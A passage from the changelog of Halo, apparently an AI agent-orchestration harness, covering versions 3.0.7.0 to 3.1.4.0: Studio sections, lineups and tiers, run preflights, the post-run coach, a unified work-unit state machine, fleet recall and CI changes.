- **Roles explains its glow:** hover a card's glyph or badge for the legend (working cyan, waiting amber, done green, failed red, and when each comes and goes); done fades out ten seconds after, failed stays until you click the card, a queued agent does not glow. Tier boxes and edges take the same state colours with the HUD brackets; a one-tier lineup fans out under main; an empty canvas says "Drag a bio here, or New lineup".
- **The holo look on Session and Roles:** four-corner brackets, glass over the canvas grid, mono figures on one baseline, no idle breathing, waiting pulses three times then holds; every animation off under reduced motion.
- **New front-page captures:** `docs/media/studio-session.gif` and `studio-roles-live.gif` (`tools/capture_session_anim.py`), and `studio-session-live.png`.

### R4: the front page

- README.md leads with Halo Studio: Session and Roles first, with the animated captures, then Fleet, Orchestra, Team and a short Design; the subscription section, the dock, code review with a judge, remote control from Signal, one paste instead of screenshots and the levels are gone from the page (the judge, the Signal bridge and the clipboard paste stay in the product). The comparison and feature tables follow the same cut.

## [3.1.4.0] - 2026-10-20

The session dashboard: Studio gets a Session section that shows your own session the way Fleet shows a fleet, the Fleet panels stop fighting narrow widths, Org and Flow leave the product, the model you pick is where you look and the catalog behind it resolves providers the way a session does. All four rounds came from the owner's live use on 2026-10-19.

### R1: Studio polish from the live check

- **The Fleet Activity log keeps a readable text column.** A line is time, kind, who and the text, which keeps at least 160 px and breaks between words; under 440 px the text takes the full width under the time, kind and who row (at the 3.1.3.0 default width it was drawn one letter per row). The timeline draws at its real width, so lane names keep their size in a narrow panel; Attention, Health and Capabilities break at words too.
- **A calmer default Fleet layout.** Five panels open: People and Costs over Attention on the left, the Map over Activity in the middle; Health, Capabilities, Agent and Mission wait as title strips down the right edge, one click away. Picking an agent opens Agent, M opens Mission, Reset layout brings the default back, a layout you saved before is kept. A panel that opens from its strip moves the panels it covers down instead of drawing over them.
- **The Mission panel's five how-it-works lines fold** into one "How this works" line once you type a goal or a mission exists; a click opens them. Every caption on a compact face is at least 12 px.
- **Expand on Costs no longer stops Studio** (its cap rows re-rendered without end).
- **Tests:** the hook-timeout test measures from the hook's own start and the wizard's Ctrl+N / Ctrl+E test polls to deadlines, so a slow Windows runner passes them; both still fail on a real regression.

### R2: the session dashboard

- **Session** is a Studio section (`Alt+6`, "This session, live", `halo studio --mode session`): the Fleet panels scoped to this harness. Map (one card per session on this machine, its agent tree, the working node lit; the newest working agent selected on enter), Agent (its streams, Steer, Pause / Resume, Stop, Follow, Pin), Activity (the timeline lanes and the live log of the chosen session, or of every session here), Attention (this harness's rows) and a new **Cost** panel: the chosen session's spend, tokens in and out, turns, elapsed, model and each agent's cost. No copy of a Fleet component: the Fleet stores take one scope `{harness, session}` that the section sets while it shows; Fleet keeps everything. Until this harness has a live session it is a Start view.
- **Studio lands on Session** when nothing is saved for the browser and a session of this harness is live (the served page carries `data-live-session`); `?mode=session&session=<id>` opens it on that session.
- **`/studio`** in the terminal opens Studio on the session you are in (the Studio page already open is focused, else the browser opens it, else one starts, and one line says which); `/studio <section>` opens that section. **`halo studio --session [<id>]`** is the CLI twin (the newest live session when `<id>` is left out; a prefix will do).
- **Links into it:** this harness's nodes in the Fleet rail, **Open in Session** in a map node's `...` menu, **Watch in Session** on the Roles Live tab and on a live Orchestra run's line. The fleet's session rows carry `turns`, `tokens_in`, `tokens_out`, `context_tokens` and `context_limit`.

### R3: Org and Flow are gone

#### Removed

- **Org and Paperclip.** `halo org`, `/org`, `halo paperclip`, `halo paperclip-run`, `halo setup orgs` and the wizard's Orgs step, the org editor, the org templates, the agent tool's `org` call with org budgets, approval gates and org-run resume, Studio's Org section, and the lineup `org:` section (positions, `reports_to`): in Roles every card now hangs off main.
- **Flow.** `halo flow`, `halo postiz`, Postiz posts and metrics, the `social-post` flow, Studio's Flow section, the coach's flow rules, the team stage kind `flow`, the mission part kind `flow`, the work unit kind `step`, the `flow_*` feed kinds and Fleet's flow gate row. Media stays: the Media panels and `Media:` commands live in Design.
- **Old files keep loading.** A `config.json` with `orgs` or `paperclip` loads and `halo doctor --config` says "orgs: removed in 3.1.4.0, the section is ignored" (and the same for paperclip). A lineup with `org:` loads with one warning, "org: removed in 3.1.4.0, ignored", in `halo teams validate`, the preflight and doctor; it never blocks a run. A team stage of kind `flow` fails validation with one line that names 3.1.4.0 and the stage. Nothing under your home is deleted.
- **Studio has six sections, and three keys moved.** Orchestra `Alt+1`, Roles `Alt+2`, Design `Alt+3` (was `Alt+4`), Fleet `Alt+4` (was `Alt+6`), Team `Alt+5` (was `Alt+7`), Session `Alt+6`. `?mode=org`, `?mode=flow` and `halo studio --mode org|flow` are gone; a saved last section of Org or Flow opens Roles.

### R4: the model is where you look

- **One model select wherever an agent is configured.** Roles: the Inspector's MODEL strip ("runs on: <model>", the card's own model saved at once, "change the bio's model"), reached from the card's pill or Enter; the bio form opens on MODELS with the picker table under "more...". Also in Assignment's Model override, Orchestra's goal form (no longer under the disclosure; "the lineup's (<model>)"), and Design's New project dialog and Projects panel. A Team stage shows what it runs on and links to that card.
- **Studio's model catalog resolves providers the way a session does** (the env file, the shell, the settings.json `env` chain): a Databricks or OpenRouter key that a session finds no longer reads "No provider is set up". The same bare-environment mistake is fixed in `halo models --capabilities`, the fleet capabilities and the coach's prices.
- **Refresh asks every provider at once,** 6 s each, and gives one line each (ok and how many; no key, timed out, HTTP <status>, unreachable) and when it ran. The Models panel names every provider it looked at and why it lists nothing. Ollama hosts are asked too.
- **The model select is never empty:** the refs your config, bios and lineups name, and (with OpenRouter set up but no live list) Halo's shipped list, both marked "not verified". Test says whether a ref answers.
- **New routes:** `GET /api/models/resolve`, `GET /api/models/fallback`, `PUT /api/design/<slug>/model`.

### Fixed

- **Every shipped bio runs on the session's model.** The built-in `orchestrator` bio pinned `or:anthropic/claude-fable-5.1` (and seven other shipped bios pinned OpenRouter models), so a lineup slot using one of them silently routed through OpenRouter on a Databricks or local session. The eight bios now say `models.preference: default`, carry no provider-pinned fallback, and each keeps a comment naming the class of model that suits the role.

## [3.1.3.0] - 2026-10-19

The coach loop: a coach card can be explained by the run's own lead and applied in one confirm, with a way back. The last of the four versions from the 2026-10-18 assessment.

### R1: the coach asks a model, Apply writes, the rules live once

- **The coach loop.** A coach card can now be explained by the run's own lead (`halo coach <run> --model`, `/coach --model`, Studio's **Ask the model**; one paragraph per card, kept in `<run>/coach.ask.json`, `--refresh` asks again) and applied in one confirm: **Apply** shows the file and the before -> after diff, then writes the bio field, lineup model or plan step through the same writer Studio's editors use (`halo coach <run> --apply ID`, y/N or `--yes`). Every apply is recorded in `~/.halo/coach/applied.jsonl`; **Undo** (`halo coach --undo [ID]`) puts the file back when nothing changed it since. The old Apply (open the editor, nothing saved) is now **Edit**.
- **`halo coach [RUN]`** takes a run of any kind; the four kind verbs take the same flags.
- **The coach line** "coach: N suggestions, M applied, top: ..." in the Orchestra, flow, mission and team reports and one coach row per run in `halo fleet digest`.
- **The coach's rules live once** (`orchestra/coach_rules.py`) for every run kind; some flow, mission and team card ids and texts changed (`coordination-<stage>-loops`, `tools-<unit>-claim-<key>`).

### R2: the terminal keeps up

- **Typing keeps up with the typist.** Every status-bar tick, phase line, tool card, agent card, thinking block and level-band frame asked Textual for a full screen layout (every transcript widget, thousands in a long session: 100 ms at 50 turns, 400 ms at 150), once a second and more, and the keys typed meanwhile waited behind it. They now repaint in place (`tui/widgets/inplace.py`: a layout only when the widget's height can change). At 50 turns: idle CPU 14% -> 0%, screen layouts per typed key 6 -> 1, none for a slash command; the slash menu rebuilds once per change instead of once per entry.
- **Mouse reports stay out of the prompt** (Windows). A report split across two console reads with a quiet gap between them was released to the parser after 30 ms, which typed its tail (`[<35;7`). A held report head now waits up to two seconds for its tail and is dropped, never typed; a head whose tail was lost to a console-mode flip goes with it. `HALO_INPUT_TRACE=<file>` appends every raw console batch for a report.
- **Resizing settles first.** Windows size records settle for 60 ms before one Resize reaches Textual, so a window drag no longer re-lays out the whole transcript per size record, and the level band and status bar repaint in place after it (two layouts fewer per resize).
- **The level band needs 24 rows** (was 32: a half-height window lost the game) and comes back the moment the terminal has room again instead of on its next idle tick.

## [3.1.2.0] - 2026-10-18

One run model: a lane, a mission part, a team stage and a flow step are one unit of work on one ten-state machine, with one ledger line and one report row, and `halo work` prints any run of any kind as one table. The machine is enforced; a team stage's members run at the same time; an orchestra or flow stage can run on a fleet member; a stale downstream lane is never merged stale; a plan is priced before it runs and a team has a budget line; recall reaches across the fleet; and the two-machine check is one command on each box. The third of the four versions from the 2026-10-18 assessment.

### R1: one unit of work

- **`halo_harness/work/`, the unit model.** A `Unit` (kind lane | part | stage | step, id, title, run, owner, claims, needs / gives / after / base, state, gate, acceptance, cost, started / ended, attempts, error, refs, extra) is what every engine's piece of work reads as, on ONE ten-state machine (`pending`, `ready`, `running`, `waiting`, `gated`, `done`, `failed`, `merged`, `skipped`, `stopped`) with a per-kind alias table so each engine keeps its own words. The adapters (`work/adapters/{lane,part,stage,step}.py`) are the only place that knows `lanes/<n>.json` from `parts/<n>/result.json`; the files on disk keep their shapes, byte for byte.
- **One ledger line, one report row.** Every engine's `events.jsonl` / `log.jsonl` / `changes.jsonl` line maps onto a `LedgerLine` (`{ts, kind: state | claim | gate | change | handoff | note, unit, run, by, key, text, native, data}`); orchestra, mission and flow `report.json` gain a `units` key beside their old rows (nothing removed); a team's board serves `board.units`.
- **`halo work [RUN] [--json]` and `GET /api/work/<kind>/<run>`** print any run of any kind as one table: unit, kind, state, owner, gate, cost, harness.
- **Coach rules on one module.** The five Orchestra coach rules moved onto the shared `orchestra/coach_rules.py`; the flow, mission and team rules follow in 3.1.3.0 (the coach round), since folding them changes pinned suggestion ids.
- `docs/WORK.md` (the model, the state machine with the four alias tables, the ledger line, the report row, `halo work`, the route); a pointer paragraph in ORCHESTRA, MISSIONS, TEAM and FLOWS; "unit" in the glossary.

### R2: scheduling on the unit model

- **The state machine is enforced.** Every lane, mission part, team stage and flow step state write goes through `Unit.move`; a move the machine has no edge for raises with the unit, from and to, and nothing is written. Five edges the engines need were added (docs/WORK.md lists them).
- **Team stage members run at the same time**, bounded by the tightest `max_parallel` of their lineup tiers (no tiers: all at once, at most 8); the lead merges after them. The board row's `members_state` and Studio's board show each member's state; one failing member fails the stage after the others end.
- **Orchestra and flow stages on a fleet member.** `harness: <member>` on a team's orchestra or flow stage sends the run to that member as a one-part mission; it runs there and hands back its report (`stages/<id>/report.json`); the board shows the harness and the remote run id.
- **A stale downstream lane is never merged stale.** When the gate sends a lane back, every lane that started from its head is marked stale and waits; once the upstream is written again it is re-based (and its tests run) or sent back to its own worker on a conflict. The run console shows the STALE badge and the re-base line.
- **The cost forecast.** A plan's lanes are priced before they run (the lead's `est_tokens`, else a stated heuristic, at the model catalog's prices) against the goal's new `budget_usd`: `forecast.json`, `GET orchestra/<run>/forecast`, a Cost column in `halo orchestra plan`, cost chips and a red over-budget total on the plan canvas; Approve warns over the budget.
- **A team budget line.** `budget_usd` on a team file and on a stage: a stage whose forecast would pass either is not started; the board says why and the Attention queue offers Raise / Skip / Stop. `halo team status` shows spent, forecast and budget.

### R3: the two-machine check, recall across the fleet

- **The scripted two-machine check.** `python tools/live_fleet_check.py hub` on one box and `python tools/live_fleet_check.py member <host>:<port> --code "..."` on the other run the whole delegation path end to end: `fleet who`, a mission part on the member, a team with a delegated agent stage (its gate answered on the hub) and a delegated flow stage, and recall across the fleet. Each step prints PASS / FAIL with its evidence, then a summary, an exit code and a `--json` report; `--fake` needs no model (run it from a repo checkout); `--keep` leaves the hub up. docs/FLEET.md "The two-machine check".
- **Recall across the fleet.** `halo recall --fleet <query>` (and `/recall --fleet`) asks the hub to fan the query out to every online member; each answers from its own index, only the hits leave the box, and they are merged by score, each labelled with its harness. `fleet.recall.share: false` keeps a box out; `fleet.recall.hide` lists memory kinds it never answers; each answer is a line in the member's journal. Routes `GET /api/recall?q=&fleet=1` and `GET /api/fleet/recall?q=` (Studio's recall box, and its Fleet switch, come with 3.1.3.0).
- **A delegated unit's harness.** A unit's report row and `halo work` show the fleet harness a mission part or a delegated team stage ran on (`refs.harness`); a local unit reads "here".

## [3.1.1.0] - 2026-10-18

The first ten minutes: a stranger goes from install to a coached run with `halo start`, every word Halo uses has one paragraph behind `halo explain`, the Start views tell one story, one command lists every config file in effect and one check validates them all, the docs have a map and the long ones are split by task, and Studio is the one editor while the terminal shows and opens. The second of the four versions from the 2026-10-18 assessment.

### R1: the guided start and the glossary

- **`halo start`, the ten-minute start.** One screen per step, each with one sentence of why and the command it runs (Enter to go on, `q` to stop, `--yes` straight through, `--json` a summary): a shipped lineup copied into your scope as `my-<name>` with its cards and tiers, a sample repo (`~/.halo/start/<date>/basket/`), one Orchestra goal with `plan: review`, the lead's plan to approve (or change on Studio's plan canvas), the live lanes, the report's checks and the coach, and where to go next (Roles, Team, Fleet). It runs on your configured model; with none it says so and offers `halo init`. `halo init`'s last step offers it (default No). `/start` runs it in a panel in the TUI. `HALO_START_FAKE=1` runs the whole path on fake model calls.
- **`halo explain <word>` and the glossary.** `docs/GLOSSARY.md` has one paragraph for each of 23 words (lineup, bio, role, tier, team, member, block, stage, lane, part, flow, step, mission, gate, claim, hand-off, plan, coach, orchestra run, fleet, hub, harness, capability). `halo explain` prints a word's paragraph, with a loose match (`halo explain lineups`), or lists them all. `/explain` shows it in a card. In Studio the `?` menu gains a Glossary and every section's help links the words it uses (`GET /api/glossary`).
- **Studio: Start here and one story.** A fresh home (no lineup of your own, no run) opens on a Start here card: run the ten-minute start in Studio (its steps stream as `start` frames on the live feed) or "Just look around" (remembered for the home). Every section's Start view ends on a Next footer, Roles -> Orchestra -> Flow -> Team -> Org -> Design -> Fleet.

### R2: config in one place, the docs map

- **`halo config where`.** One table of every file in effect for this folder and home: Halo's `config.json` and `routes.json`, the env file (variable names only), Claude Code's `settings.json` layers and MCP files, the active lineup and those it extends, the lineup, bio and flow folders, the team file and the Databricks preset. For each file: what it sets and which file wins a key two files set, the way the resolvers decide it. `--json` prints the rows; `/config where` shows the same table in the TUI. A repo `.halo/config.json` and a `.env` are listed as "not read".
- **`halo doctor --config`.** Checks every one of those files against one schema set (`halo_harness/schemas/`) and the existing validators. It reports unknown keys with the closest known key, wrong types, a lineup or team naming a bio or lineup that is not there, a flow naming a lineup that does not resolve, `team:` naming a missing lineup, and a key two files set to different values, with the file that wins. Studio: `GET /api/doctor/config`, and a Config group in Roles' Problems panel for the open lineup.
- **The docs map.** `docs/README.md` lists every doc by task, each with one "read this when" line; every doc opens with the same line. MODELS.md, STUDIO.md, SLASH-COMMANDS.md, ARCHITECTURE.md and COMMANDS.md are split by task into parts of at most 400 lines (the original file is the entry page that links them; `halo start`, `halo explain` and `halo setup` sit with `halo init` in `COMMANDS-init.md`). Links follow their headings, and `tools/split_doc.py` does the split.

### R3: one editor

- **One editor: Studio.** Bios and lineups are edited in Studio; the terminal shows them and opens Studio on the one you want to change. `halo studio --edit bio:<name> | lineup:<name> | team` opens Roles on that bio's form, Roles on that lineup with the Inspector on its Lineup tab, or the Team section (`?mode=roles&edit=bio:<name>` in the URL). A Studio already running for this home is reused: every page open on it switches to the target (`POST /api/focus`, a `focus` frame on the live feed) instead of a new tab opening. `--no-open` prints the URL. `halo agents edit <bio>` and `halo teams edit <lineup>` open Studio the same way (`--no-open` prints the URL, `--yaml` opens `$EDITOR` on the file for a box with no browser); `new <name> --studio` writes the starter file, then opens it. In the TUI, `/edit <thing>` (a target, or a bare bio or lineup name), `/agents edit`, `/teams edit` and `e` in the views open it and say whether the browser opened, or print the URL.
- **The terminal's bio and lineup views.** `/agents` (and the wizard's Agents list) and `/teams list` show a bio or a lineup read-only on Enter (`/agents view <name>`, `/teams view <name>`): every field with its one plain line, inherited values marked, the rules as sentences, each lineup section's YAML, the resolved assignments, warnings and costs. `e` opens Studio on it; `t` tries the bio (cost first) or probes the highlighted row's model; Smoke run runs a lineup's acceptance prompts. New and New from... write a starter bio and open it in Studio. The wizard's Team step gains **Edit in Studio** (Ctrl+E); Ctrl+N writes a new lineup and opens it in Studio. The terminal forms are gone, and `--form` with them.
- **Field parity in Studio.** The bio form gains tags, the context budget, effort xhigh, the tools rules, context files, skills and the memory namespace, environment (own worktree, offline), acceptance, the schedule and the triggers, a YAML toggle for the whole bio, and Save to project scope (the lineup header has it too). Every field of the bio form and the lineup inspector shows the same help line the terminal shows, served by `GET /api/field-help` from `halo_harness/field_help.py`.

## [3.1.0.0] - 2026-10-18

Suite and repo health: the test suite that gated nine red runs in two days is isolated per module, split into a fast and a full tier, and driven by one Chrome base; Windows CI moves off the per-push gate without leaving the release gate; line endings are settled once and the last modules named by line count are named for what they do. The first of the four versions from the 2026-10-18 assessment ("Love it do all that!").

### R1: suite isolation and CI tiers

- **Every test module runs in its own home.** `tests/run_all.py` gives each module a fresh `BRIDGE_TEST_HOME` (a short name under a short scratch root, removed after it) and resets the state-dir caches between modules, so no module sees another's catalog, config or sessions; `ensure_scoped_state_dir_once` re-scopes once per module; the real-home guards are unchanged.
- **Two tiers.** `python tests/run_all.py --fast` skips the modules marked `TIER = "full"` (headless Chrome, TUI pilots); `--tier full` runs only those; no flag runs everything.
- **One Chrome driver base.** `tests/helpers/chrome_driver.py`: every Studio driver and capture tool scopes the home first, finds Chrome through `HALO_CHROME` first, and only one headless Chrome runs at a time (a file lock across threads and processes); a failed step is named in the driver's JSON line.
- **Windows off the per-push gate.** CI runs Linux on every push and pull request and Windows on tags, nightly and `workflow_dispatch` (with a `sha`); `scripts/release.py` step 0 dispatches the Windows run for the sha it releases and goes on only when the Linux and Windows runs for that exact sha both concluded success (`--skip-windows` accepts an existing green Windows run).

### R2: repo health

- **LF everywhere.** `.gitattributes` starts with `* text=auto eol=lf` (images, fonts, archives and `.pyc` are binary, `bin/*.cmd` stay CRLF), so every checkout is LF whatever `core.autocrlf` says; `scripts/release.py` writes LF on Windows too (a CRLF `checksums.txt` failed `sha256sum -c`); `tests/test_line_endings.py` checks the rule, the index and that no byte comparison of a text file skips folding CRLF.
- **Modules named for what they do.** The last modules named by line count are re-cut by responsibility: Studio's Design routes (`design_artboards_api`, `design_assets_api`, `design_critique_api`, `design_system_api`, `design_export_api`, `design_request`, `design_turns`), Flow (`flow_request`, `flow_assets_api`), Fleet (`fleet_watch_sources`, `fleet_feed`, `fleet_send`, `fleet_handoff_api`, `fleet_recording_api`; `fleet/cli_join`, `fleet/cli_members`; `fleet/mission_assign`, `fleet/mission_claims`), the coach (one `coach_<kind>_rules` per run kind, `coach_lane_facts`, `coach_prices`), the team validator (`team/validate`, `team/validate_stages`, `team/resolve`) and `halo orchestra` (`orchestra_cli_views` beside `orchestra_cli_run`). No command, route or output changed. `docs/ARCHITECTURE.md` has a module map of Studio, fleet, Orchestra and team that the suite checks against the tree, and no module may be named `*_more.py`, `*2.py`, `*_extra*.py` or `*_rest.py` any more.

## [3.0.9.0] - 2026-10-17

Hand-offs and the graph: a lane can start after another and take what it left, a sequenced mission part starts from the earlier part's head, the lead's plan can be reviewed and edited on a canvas before it runs, a saved flow draws as a graph, and after any run a coach reads the run's own files and says what to change, with Apply into the bio, the lineup or the plan. The three OpenFlow ports from the 2026-10-17 roadmap entry. Rolo's order, 2026-10-17: "complete all the different version numbers".

### R1: hand-off artifacts

- **Orchestra hand-offs.** A lane can start after another (`after`) and take what it left (`handoff.needs`: `summary`, `all`, or a named give: a file, its units, an artifact it saved); the lead declares it in its split, goal.json can pre-declare it under `handoffs:`. Checked in code (real jobs, no cycles, takes that exist). A lane with upstreams starts from their finished head (two: their merge; a conflict leaves it waiting and the run stops naming it), its prompt gets a Hand-offs section, artifacts land git-ignored under `.halo/handoff/<job>/`; a lane that takes nothing sees only the goal. lanes/<n>.json gains `handoff`, `after`, `base`, `gave`; workflow.json gains `after` edges and `layers`; the merge keeps the layer order. Undeclared runs are unchanged.
- **Missions: the sequenced part starts from the earlier part's head.** A repo part with `depends_on` starts from its repo dependencies' finished branch (two or more: their merge, conflicts to the fresh judge); a member gets it as `parts/<n>/base.bundle`. `base` is in the part state, result.json and the report (a Base column). A part's `outputs` are its hand-offs: a dependent part reads exactly those plus the hand-back, or everything with `take: all`.
- **Studio.** Lanes draws an arc and a label chip from each lane to the lane that starts after it and a base line on every lane; the Workflow graph hangs it off its upstream. The Mission map labels each depends_on edge with what it hands on and each repo part with its base. "Hand-offs" in How this works for Orchestra and Fleet.
- Known: a downstream lane already started from an upstream's head is not re-based when the gate sends that upstream back; the merge and the gate still check the result.

### R2: the plan canvas and the flow graph

- **Review the plan before it runs.** A goal can say `plan: review` (`halo orchestra run --review`, Studio's "Review the plan before it runs"): the run stops after the lead's split with the run `planned` and waits for `plan.json`. `halo orchestra plan` prints it with its problems, `approve [--file F]` checks and hands it to the run, `reject --reason T` stops the run with the reason. The check (`workflow.validate_plan`): unique ids, titles, claims that exist, real `after`/`needs`, no cycle, takes the upstream gives, no overlapping claims without an `after`, and each lane's bio/model through the lineup preflight. Lanes can carry their own `bio` and `model`; the approved plan may add or drop lanes, and two sequenced lanes may share a unit.
- **Studio: the plan canvas.** While a run waits for review the Orchestra section shows one panel: the lanes as cards in DAG layer boxes with labelled `after` edges; drag a card into another box to change what it runs after, edit title, claims, bio, model (picker with Test this model), needs and gives in the inspector, Add / Drop lane, Undo / Redo; every edit is checked and problems outline their cards in red; Approve and run stays disabled while one remains; Reject asks for a reason. Routes `GET|PUT orchestra/<run>/plan`, `POST .../approve|reject`.
- **Flows as a graph.** "Show as graph" draws a saved flow's steps in dependency layers (from their `$.<step>` refs), the gate marked; dragging two independent steps rewrites the file's order through the new `PUT flow/templates/<name>` (validated; shipped templates are copied to `~/.halo/flows/` first).

### R3: the post-run coach

- **The post-run coach.** After a run, `halo orchestra coach [RUN]` (and `halo flow coach`, `halo fleet mission coach <id>`, `halo team coach`) reads the run's files, no model call, and suggests what to change, each with its evidence: a bio's prompt (a lane sent back twice for the same reason, a reply that restates the goal), a lane's model (a cheap lane at the return cap beside a dearer lane that finished first try; a top-tier lane that finished first try dear with a small diff), a bio's tools (a denied call, a refused claim), the plan's structure (a lane that waited on another's claims or conflicted with it -> `after`; a lane that wrote nothing -> drop) and coordination (a gate that looped, a mission part asked longer than the median, a team stage gated twice). `--json` prints the result.
- **Studio: the Coach tab.** A finished run's Report panel (Orchestra and Flow) has a Coach tab, an ended mission a Coach face, a done team run a Coach button: the cards grouped by kind with a severity chip and the evidence in mono. Apply opens the bio form with the field filled in and marked, the lineup on its Lineup tab, or the plan editor with the edit staged; nothing is saved until you save there. Dismiss hides a card for that run. Routes `GET orchestra/<run>/coach`, `flow/runs/<id>/coach`, `fleet/missions/<id>/coach`, `team/coach?run=`, cached in the run's `coach.json`.
- **Run evidence.** A lane file keeps the `bio` and `model` it ran with and the tool calls its worker was denied (also a `note` line); a refused claim is a `claim` line with `op: refused`. A bio's new `context.prompt_notes` are added after its prompt.

## [3.0.8.0] - 2026-10-17

Team: a project's people, blocks and stages on one board. A team file names the brief every agent reads first, the members (instances of lineup aliases, here or on a fleet member), the blocks they work in (a file, a folder or a git tree, each with its own claims ledger) and the stages that move the work (an agent turn, an Orchestra run or a flow, triggered by hand, by a stage finishing or by a block changing, held by a gate). `halo team` runs it; Studio's seventh section draws it live. Rolo's order, 2026-10-17: "complete all the different version numbers".

### R1: the team engine

- Teams: `halo team` runs a project's team file (`<repo>/.halo/team.yaml`, else `~/.halo/teams/<project>.team.yaml`): a brief every agent reads first, members (instances of lineup aliases, here or on a fleet member), blocks (a file, a folder or a git tree) and workflow stages (an agent turn, an Orchestra run or a flow) with reads, writes, a trigger (manual, `stage_done:<stage>`, `block_change:<block>` after a settle window), a lead, a gate and an acceptance. `halo team init|validate|run|status|board|answer|stop|log|blocks`, each with `--json`; the lineup preflight runs for every member first (`--force` runs anyway). See docs/TEAM.md.
- Blocks keep a ledger (`.halo-block/`: claims, one line per write, the holders); while a stage runs, a member's writes stay inside the stage's write blocks and its own claims, and a write to a part another member holds comes back naming the block and the holder.
- A required gate holds a stage until `halo team answer <stage> accept|redo|stop` (redo runs it again with the text); a member with `harness: <fleet member>` runs on that harness through the fleet's `run_task` (asked, running, refused show on the board).
- Studio: `/api/team/...` (the team, validate, the board, run, answer, stop, the blocks and their changes, the events) and `team` frames on the live feed, for the Team tab.
- Known this release: the members of one agent stage run one after another; Orchestra and flow stages run on this machine only; a delegated member has not yet been exercised against a real fleet member.

### R2: the Team tab

- Studio: **Team** is the seventh section (`Alt+7`, `halo studio --mode team`, `/studio team`): the project's team file as one board -- members as columns, stages as boxes coloured by state in their members' columns, blocks in a band underneath with a claim badge (amber while someone writes) and the last change, and the `stage_done` / reads / writes / `block_change` edges; a run bar with Run next, Stop (asks for a reason) and Validate; the Inspector for a stage (Run, problems inline, Run anyway past the preflight, the gate card with Accept, Redo and Stop), a block (holders, change lines) or a member (its lineup opens in Roles); the change feed with kind chips. Live from the `team` frames. With no team file a Start view whose **Make my first team** writes the template (`POST /api/team/init`). See docs/STUDIO.md.
- Fleet: a team stage held at its gate is a **team gate** row in the Attention queue (`A` accept, `R` redo, `S` stop, `O` opens the Team section on it); the status bar's TEAM cell counts the stages running and at a gate.
- `halo team init` and Studio share one `init_files`; a board read that lands while board.json is replaced (Windows) reads again instead of answering an empty board.

## [3.0.7.0] - 2026-10-17

Tiers and the ports: a lineup stacks its members in tiers and the harness enforces who may spawn whom; every run starts with a preflight that names what would make members come back empty; Roles, Org and Design are React sections of the Studio shell and the classic page is gone. Rolo's order, 2026-10-17: "complete all the different version numbers". The Home section from the earlier plan is not built: the Fleet panels already show live sessions, cost today and health.

### R1: Tiers, the preflight, the model probe

- Lineups: `tiers:` stacks members (`[{name, members, max_parallel}]`); a member spawns only into the next tier down, the main agent sits alone in tier 0, and a tier's `max_parallel` caps its live members across the session tree. Aliases left out join an implicit last tier `rest` (a warning line); a lineup without `tiers` behaves as before. `halo teams validate`, the lineup editor and Studio check it; Studio's graph carries `tiers` and a layout keeps each tier's collapsed state (`{nodes, tiers}`; the old flat layout files still read). A three-tier stack needs `delegation.max_depth: 2`.
- Run-start preflight: `halo orchestra run`, `halo flow run`, a mission run and their Studio routes list every lineup problem that would make members come back empty (a model id not in its catalog, a missing bio, a bio whose `tools.allow` is empty, a tiers problem), each with its fix, and stop; `--force` / `{"force": true}` runs anyway. `halo doctor --roles` lists the same findings for the active lineup. An empty Databricks catalog counts as unverifiable, no longer as "every dbx role dead".
- `halo models test <ref>`: a one-token probe that prints ok and the latency or the error (exit 1 on failure); Studio's `POST /api/models/test` and the lineup editor's `t` key run the same probe.
- Studio: `GET /api/tools` lists the real tool registry.

### R2: Roles in React, the classic page gone

- Studio: Roles (Alt+2) is a React section. Lineups (New, Duplicate, Delete, Apply, each asking on a card), the canvas (agent cards with their scope, instances, model, price in / out, context, gym score and warnings, in one labelled box per tier; drag a card into another tier and the lineup saves, the main agent stays in tier 0; collapse a tier; drop onto a card to report to it), the Inspector (the card's slot; every lineup section as a small form with a YAML toggle; Live), Problems (every edit checked at once: the validator, a model id its catalog does not know, a bio with no tool, aliases in no tier, a tier stack too deep for `delegation.max_depth`, each with its fix), Bios (the bio form with a model picker table: sort by price or context, search, best for, gym score; **Test this model** shows ok and the latency inline) and Models (the catalog per provider, Refresh). Undo / redo every edit (Ctrl+Z / Ctrl+Shift+Z). A Start view shows until you have a lineup of your own.
- Studio: Live Roles, J / K hop and the session replay run on the React Roles canvas (no framed page, no postMessage).
- Studio: the classic page is gone (`static/legacy/`, `/legacy/`, `halo studio --legacy`); a checkout without a UI build answers `/` with how to build it.
- API: `GET /api/gym` (the gym's scores per catalog ref), `GET /api/models/best-for` (what each model is good for); `POST /api/validate` and `GET /api/lineup/<name>` carry `findings` (`{id, severity, text, fix, node}`); `GET /api/lineups` rows carry `shipped_copy` (an untouched copy of a shipped lineup is matched by its lines, not its line endings).

### R3 and R3b: Org and Design in React

- Studio: Org (Alt+3) is a React section. Company (Paperclip installed / running / linked, the Org mode switch, Install, Link, Sync, Pull), the Org chart (team boxes, reports-to lines, drag to move with positions saved on the server, drop into a box or onto a card to change a manager after a confirm), Issues / goals / projects, and an Inspector with Wake / Pause / Resume / Terminate. A Start view shows when Paperclip is not running or no company is linked. One diffed 3 s poller redraws only what changed.
- Studio: Design (Alt+4) is a React section. Projects, Assets (upload, download), Artboards (versions, Restore, Critique, Contrast, Rename, Delete, Download, Export, Handoff, positions saved on the server as `layout/design:<slug>`) and the Thread: turns as safe markdown, streamed over the live feed (`design_turn` frames), with **Cancel turn**. A Start view shows when there is no project.
- Studio Design: the classic page's last features are in the React section. Knobs live in the Artboards panel's settings: a card's **Knobs** button opens them, and a `css:` knob is saved as a new version at once. Double-click a text in a prototype to edit it in place: Enter saves a version, Esc cancels. The **Comment** tool pins a comment where you click, and a pin opens its text with **Resolve**. The new **Design system** panel lists the tokens by group, with swatches, edits them (**Save tokens**) and syncs them from a folder or a web page with a result dialog. **3 directions** beside Send makes three artboards laid out in one row. A device select draws prototypes at phone, tablet or desktop size and is kept as the panel's setting.
- API: `POST design/<slug>/artboard/<id>/rename`, `DELETE design/<slug>/artboard/<id>`, `POST design/<slug>/turn/<id>/cancel` (the turn ends with code 130, `cancelled`), `/design-files/<slug>/_assets/<name>` and `?edit=pick` (the double-click picker behind in-place text edits); layouts accept `design:<slug>`; a design turn's history keeps the model's reply text.

### Fixes after 3.0.6.0

- Fleet capabilities: the cached catalog is re-read after every save -- on Windows, `halo mcp add/remove` right after a refresh could read back the old catalog (same mtime tick) and never mark it stale.
- `halo fleet status` waits up to 10 s (was 3 s) for the hub this machine serves, so a loaded box still reports its member count.
- Hub commands: a command sent in the moment between a session's announce and its stream attaching (or while its relay re-attaches) waits up to 3 s for the stream instead of answering 409 "not connected right now".
- Tests: the bio-editor help-line test polls for the focused field's line instead of one fixed pause (the Windows CI runner missed it).

